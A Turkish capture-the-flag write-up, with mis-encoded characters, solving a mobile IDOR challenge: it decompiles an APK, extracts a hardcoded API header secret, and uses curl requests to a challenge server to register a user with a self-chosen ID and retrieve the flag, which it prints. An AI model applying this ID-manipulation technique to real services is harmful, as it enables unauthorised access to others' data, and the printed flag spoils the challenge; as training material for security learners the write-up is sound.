# ğŸ“± IDOR - Mobile Challenge

**Kategori:** Mobile  
**Zorluk:** Orta  
**Puan:** 2000

**Challenge DosyasÄ±:** app-release.apk  
Kaynak: GitHub - pitoctf

---

## ğŸ¯ Challenge AmacÄ±

Android APK dosyasÄ± iÃ§erisinde **IDOR (Insecure Direct Object Reference)** zafiyetini tespit etmek ve istismar ederek flag elde etmek.

**Strateji:**

* APK decompile
* API endpoint analizi
* Yetki kontrolÃ¼ testleri
* IDOR exploit

---

## â“ IDOR Nedir?

**Insecure Direct Object Reference**, uygulamanÄ±n kullanÄ±cÄ±dan gelen **ID, user_id vb. nesne referanslarÄ±nÄ±** yetki kontrolÃ¼ yapmadan kullanmasÄ±dÄ±r.

Bu zafiyet sayesinde:

* KullanÄ±cÄ±, yetkisi olmayan verilere eriÅŸebilir
* ID parametreleri deÄŸiÅŸtirilerek baÅŸka kullanÄ±cÄ±larÄ±n verileri alÄ±nabilir

---

## âœ… Ã‡Ã¶zÃ¼m AdÄ±mlarÄ±

### ğŸ“¥ 1. APK Ä°ndirme ve Ä°lk Analiz

```bash
wget https://github.com/cihangungor/pitoctf/raw/main/app-release.apk
file app-release.apk
```

**Ã‡Ä±ktÄ±:**

```
app-release.apk: Android package (APK)
```

---

### ğŸ”§ 2. APK Decompile (JADX)

```bash
jadx -d output app-release.apk
cd output/sources
```

**KlasÃ¶r YapÄ±sÄ±:**

```
output/
â”œâ”€â”€ resources/
â””â”€â”€ sources/
    â””â”€â”€ com/example/ctfchallenge/
        â”œâ”€â”€ MainActivity.java
        â”œâ”€â”€ ApiClient.java
        â””â”€â”€ ApiResponse.java
```

---

### ğŸ“ 3. MainActivity.java Analizi

```java
private final void setupApiClient() {
    this.apiClient = new ApiClient(this, "https://64.226.74.243:5241");
}
```

ğŸ“Œ **API Base URL bulundu:**

```
https://64.226.74.243:5241
```

---

### ğŸ” 4. ApiClient.java Analizi

Kritik bulgular:

```java
this.secretHeader = "X-Mob";
this.secretValue = "RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ";
```

**Endpointâ€™ler:**

* `/api/register`
* `/api/getFlag`

**Fake Flag Decode:**

```bash
echo "RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" | base64 -d
```

```
Flag{OkadarKolayDegil}
```

âš ï¸ Bu **fake flag**tir.

---

## ğŸŒ 5. API Testleri

### Test 1: KullanÄ±cÄ± KaydÄ±

```bash
curl -k -X POST "https://64.226.74.243:5241/api/register" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"testuser999","password":"pass123"}'
```

**Response:**

```json
{
  "id": 0,
  "message": "Registration successful",
  "status": "success",
  "user": "testuser999"
}
```

---

### Test 2: Flag Alma Denemesi

```bash
curl -k -X POST "https://64.226.74.243:5241/api/getFlag" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"testuser999","password":"pass123"}'
```

âŒ Normal kullanÄ±cÄ±lar flag alamÄ±yor.

---

## ğŸ”“ 6. Admin KullanÄ±cÄ± Testi

```bash
curl -k -X POST "https://64.226.74.243:5241/api/getFlag" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"admin","password":"admin123"}'
```

ğŸ“Œ Admin kullanÄ±cÄ±sÄ± mevcut fakat **yetkili deÄŸil**.

---

## ğŸ¯ 7. IDOR Zafiyeti KeÅŸfi

### ğŸ’¡ Hipotez

KayÄ±t sÄ±rasÄ±nda `id` parametresi **backend tarafÄ±ndan doÄŸrulanmÄ±yor olabilir**.

### Test: ID ManipÃ¼lasyonu

```bash
curl -k -X POST "https://64.226.74.243:5241/api/register" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"hacker999","password":"pass123","id":999}'
```

ğŸ‰ **BaÅŸarÄ±lÄ±!** KullanÄ±cÄ± **ID:999** ile oluÅŸturuldu.

---

### ğŸš© Flag Alma

```bash
curl -k -X POST "https://64.226.74.243:5241/api/getFlag" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"hacker999","password":"pass123"}'
```

**Response:**

```json
{
  "flag": "CTF{M0b1l3_4P1_M4n1pul4t10n_SSLBYPASSED_IDORFOUND_5000DolarBounty}",
  "message": "Congratulations! You've solved the challenge!",
  "status": "success"
}
```

---

## ğŸš© FLAG

```
CTF{M0b1l3_4P1_M4n1pul4t10n_SSLBYPASSED_IDORFOUND_5000DolarBounty}
```

---

## ğŸ› ï¸ KullanÄ±lan AraÃ§lar

* **JADX** â€“ APK decompile
* **curl** â€“ API testleri
* **strings** â€“ Binary analiz
* **base64** â€“ Decode

---

## ğŸ§  SonuÃ§

Bu challengeâ€™da backend tarafÄ±nda **yetki kontrolÃ¼ yapÄ±lmadan ID parametresinin kabul edilmesi**, klasik bir **IDOR zafiyetine** yol aÃ§mÄ±ÅŸtÄ±r.

Mobil uygulamalarda:

* Client-side veriye asla gÃ¼venilmemeli
* ID alanlarÄ± backendâ€™de doÄŸrulanmalÄ±
* Rol ve yetki kontrolleri zorunlu olmalÄ±dÄ±r
